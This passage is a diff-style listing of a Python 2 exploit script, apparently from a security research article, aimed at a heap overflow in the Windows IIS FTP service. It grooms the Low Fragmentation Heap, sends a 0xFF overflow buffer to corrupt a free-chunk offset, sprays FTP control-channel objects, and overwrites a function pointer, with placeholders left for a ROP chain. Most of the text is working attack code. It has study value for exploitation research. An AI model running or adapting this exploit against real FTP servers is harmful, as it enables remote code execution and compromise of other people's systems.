+            sa = self.untagged.pop()
+            self.stag[tag] = sa
+            sa.alloc(payload)
+
+    def realloc(self, tag, payload):
+        if tag in self.stag:
+
+            sa = self.stag[tag]
+            sa.alloc(payload)
+
+    def complete(self, tag):
+        if tag in self.stag:
+            sa = self.stag[tag]
+            sa.complete()
+
+    def free(self, tag):
+        if tag not in self.stag:
+            print "Error: Unknown tag %s\n" % tag
+            sys.exit()
+
+        sa = self.stag[tag]
+        del self.stag[tag]
+        sa.free()
+
+def countff(payload):
+
+    count = 0
+    for x in payload:
+        if x == "\xff" or x == "\xFF":
+            count += 1
+
+    return count
+
+def analyze(payload):
+
+    if len(payload) < 0x100:
+        return
+
+    first = payload[0:0x100]
+    first_ffs = countff(first)
+    print "[*] Sending %d 0xFFs in the 1st chunk" % first_ffs
+
+    second = payload[0x100:]
+    second_ffs = countff(second)
+    print "[*] Sending %d 0xFFs in the 2nd chunk" % second_ffs
+
+#allocations have 0x80 added to them, making sizes < 0x81 hard to allocate
+def gen_payload(size, ch):
+    if size < 0x80:
+        print "Invalid allocation size"
+        sys.exit(1)
+
+    if size > 0x180 and size < 0x200:
+        print "WARNING: Only allocating 0x180 bytes"
+
+    new_size = size - 0x80
+    #print "Payload will be %d bytes" % (new_size)
+    return (ch * new_size)
+
+def main():
+
+    #create the initial amount of connections
+    print "[*] Creating LFHPOOL"
+    lfhpool = SoftLeak()
+    lfhpool.create_pool(LFHPOOLSIZE)
+    time.sleep(WAITP)
+
+    ######################################################################
+    #Go through LFHENABLESIZE connections, and make an allocation of a 
+    #certain size. This will enable the LFH for size provided in 
+    #'gen_payload()'
+    ######################################################################
+    for i in range(0, LFHENABLESIZE):
+        name = "lfh" + str(i)
+        payload = gen_payload(0x180, "X")
+        lfhpool.alloc(name, payload)
+
+    #######################################################################
+    #Send out exploit payload, this should be of the same subsegment as the
+    #chunks we put in the LFH. It will write 0xFFs over the FreeEntryOffset
+    #stored in the 1st two bytes of a free chunk in the LFH
+    #Note: Although it actually sends a payload of 0x1C0, it will only 
+    #allocate 0x180 bytes of data to be used for this transaction
+    #Note2: This LFH chunk will be freed, hence in the section below 
+    #requiring 3 allocations instead of the two necessary for the 
+    #FreeEntryOffset overwrite
+    #######################################################################
+    print "[*] Sending overflow payload"
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST,PORT))
+    data = s.recv(1024)
+    buf = "\xff\xbb\xff\xff" * 112 + \
+      "\r\n" #ends up allocation 0x180 (0x188 after chunk header)
+    print "[*] Sending %d 0xFFs in the whole payload" % countff(buf)
+    print "[*] Sending Payload...(%d bytes)" % len(buf)
+    analyze(buf)
+    s.send(buf)
+    s.close()
+
+    #create the initial amount of connections
+    print "[*] Creating CONNPOOL"
+    connpool = SoftLeak()
+    connpool.create_pool(CONNCOUNT)
+    time.sleep(WAITP)
+
+    #######################################################################
+    #The LFH UserBlock should look like this
+    #[previously_allocated_chunk][overwritten_chunk][malicious_chunk]
+    #1) We have to make an allocation for the chunk that was used in the 
+    #overflow (since it was freed)
+    #2) 'overwritten_chunk' should be all 0xFFs (including its 
+    #_HEAP_ENTRY header)
+    #3) the 'malicious_chunk' will use a FreeEntryOffset of 0xFFFF (saved 
+    #from previous allocation)
+    #
+    #Now we can allocate a bunch of FTP_CONTROL_CHANNEL objects (see 
+    #ftpsvc.dll) These will be in the heap, so when we add "UserBlocks + 
+    #(0x7FFF8 * 8)" it will point to heap memory that contains a 
+    #FTP_CONTROL_CHANNEL object, which has a vtable as its first 4 bytes
+    #
+    #If the trailing '\n' is missing from the ftp command the function
+    #FTP_ASYNC_CONTEXT::OverlappedCompletionRoutine() will not be called 
+    #until it sees the final '\n', which gives us control over WHEN the 
+    #call will be made
+    #######################################################################
+    print "[*] Sending 0x%X USER commands" % CONNCOUNT
+    for i in range(0, CONNCOUNT):
+        name = "ftpcmd" + str(i)
+        connpool.alloc(name, "USER ")
+
+    #######################################################################
+    #1st: allocates a chunk saving its NextOffset
+    #   - NextOffset = The one after our 'malicious_chunk'
+    #2nd: allocates another, saving the tainted offset (0xFFFF)
+    #   - NextOffset = 0xFFFF
+    #3rd: will actually use the incorrect offset
+    #   - Return value will be addr_of(UserBlock) + (0x7FFF8 * 8)
+    #   - This is due to how the FreeEntryOffset is calculated
+    #
+    #The '$' * 0x170 will allocate 0x180 bytes, but will also be the data 
+    #used to overwrite the USER_SESSION objected called during logging
+    #The '$' characters would be replaced with values to start a ROP sled
+    #######################################################################
+    curr_char = 0x40
+    for i in range(0, 3):
+        curr_char += 1
+        name = "trigger" + str(i)
+        payload = "$$$$ " + (chr(curr_char) * 0x170) #allocates 0x180 bytes
+        print "[*] Sending payload%d of %d bytes" % (i, len(payload))
+        lfhpool.alloc(name, payload)
+
+
+    #######################################################################
+    #By sending the trailing '\n' command, this will force the
+    #FTP_CONTROL_CHANNEL to call its AsyncCompletionRoutine(), notifying
+    #the server that the connection has been completed. Fortunately for us
+    #this function pointer will have been overwritten by the 3rd iteration
+    #in the code above "payload = "PASS " + (chr(curr_char) * 0x170)".
+    #######################################################################
+    print "[*] Sending completing commands"
+    start = 0
+    end = CONNCOUNT
+    print "Total completions: %d" % (end - start)
+    for i in range(start, end):
+        name = "ftpcmd" + str(i)
+        print name
+        connpool.realloc(name, "\n")
+
+    #######################################################################
+    #By waiting to exit, we will ensure that the AsyncCompletionRoutine is
+    #NOT called due to  the socket closing. It shouldn't matter, since 
+    #we've already triggered it above, but just to be safe
+    #######################################################################
+    print "[*] Exploit complete!"
+    print "Press enter to exit"
+    val = sys.stdin.readline()
+
+if __name__ == "__main__":
+    main()
+
+
+--[ EOF
